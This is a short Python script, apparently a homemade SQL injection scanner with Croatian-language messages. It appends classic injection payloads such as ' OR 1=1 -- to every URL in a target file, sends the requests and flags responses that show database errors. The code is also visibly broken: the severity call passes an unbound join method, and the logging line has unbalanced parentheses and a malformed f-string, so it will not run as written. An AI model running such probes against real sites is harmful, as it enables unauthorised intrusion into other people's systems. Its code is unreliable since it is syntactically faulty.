import requests
from utils.log_utils import log_to_sheet, classify_severity

SQL_PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1 --", "\" OR 1=1 --"]

def load_targets(file_path="targets/targets.txt"):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def test_sql_injection(base_url):
    findings = []
    for payload in SQL_PAYLOADS:
        if "?" in base_url:
            test_url = f"{base_url}{payload}"
        else:
            test_url = f"{base_url}?id={payload}"
        print(f"[+] Testiram: {test_url}")
        try:
            r = requests.get(test_url, timeout=5)
            if any(x in r.text.lower() for x in ["sql", "syntax", "mysql", "query", "error"]):
                print(f"[!] Mogući SQLi: {test_url}")
                findings.append(test_url)
        except Exception as e:
            print(f"[-] Greška: {e}")
    return findings

def run_sql_injection_scan():
    print("[~] Pokrećem SQL Injection test...")
    targets = load_targets()
    for url in targets:
        found = test_sql_injection(url)
        if found:
            severity = classify_severity("\n".join)
            log_to_sheet(__file__, "\n".join(found)) + f' | Severity: {{severity}}')

if __name__ == "__main__":
    run_sql_injection_scan()
